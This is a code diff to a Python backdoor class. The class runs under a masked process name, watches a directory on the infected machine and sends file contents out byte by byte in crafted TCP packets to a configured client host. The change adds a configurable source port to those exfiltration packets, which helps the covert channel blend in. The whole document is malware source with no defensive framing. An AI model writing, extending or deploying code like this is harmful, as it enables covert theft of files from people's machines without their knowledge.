@@ -144,6 +144,7 @@ class BackDoor:
         self.path = ""
         self.watch_status = False
         self.sequence = []
+        self.src_port = ""
 
 
     def start(self) -> None:
@@ -201,6 +202,7 @@ class BackDoor:
         self.path = config['covert']['watch']
         self.client = config['covert']['client']
         self.sequence = config['share']['sequence']
+        self.src_port = config['share']['src_port']
         print(f"Masked as {self.masked_name}")
         print(f"log to {self.log}")
         print(f"device is {self.device}")
@@ -211,6 +213,7 @@ class BackDoor:
         print(f"dir  is {self.watch_dir}")
         print(f"client default is {self.client}")
         print(f"seqwuence  is {self.sequence}")
+        print(f"src port  is {self.src_port}")
 
     def watch_settings(self, path) -> tuple[str, str]:
         file = path.split("/")[-1]
@@ -250,7 +253,7 @@ class BackDoor:
         print("Creating TCP packets")
         packets = []
         for index, byte in enumerate(data):
-            packet = IP(dst=self.client) / TCP(dport=self.send_port) / Raw(load=byte)
+            packet = IP(dst=self.client) / TCP(sport=self.src_port, dport=self.send_port) / Raw(load=byte)
             packets.append(packet)
 
         # Add packet to specify end of file
